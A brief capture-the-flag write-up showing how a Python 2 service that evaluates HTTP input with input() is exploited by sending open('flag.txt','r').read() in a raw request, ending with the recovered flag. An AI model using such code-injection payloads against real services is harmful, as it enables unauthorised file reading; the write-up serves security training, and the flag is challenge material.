# Input as a Service

>In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.

the webpage seemed weird, it was like the error messages of python IDE

```
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 


 Traceback (most recent call last):
  File "/app/input_as_a_service.py", line 16, in <module>
    main()
  File "/app/input_as_a_service.py", line 12, in main
    text = input(' ')
  File "<string>", line 1
    GET /app/input_as_a_service.p HTTP/1.1
                                     ^
SyntaxError: invalid syntax
```

![](https://i.imgur.com/1QSNwQD.png)

then i noticed that it is executing python so i searched for flag.txt and read() it
```
open("flag.txt", "r").read()
GET / HTTP/1.1
Host: 138.68.167.11:30982
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

>CHTB{4li3n5_us3_pyth0n2.X?!}

[BL4CKC0FF33 ☕](https://github.com/BL4CKC0FF33/)
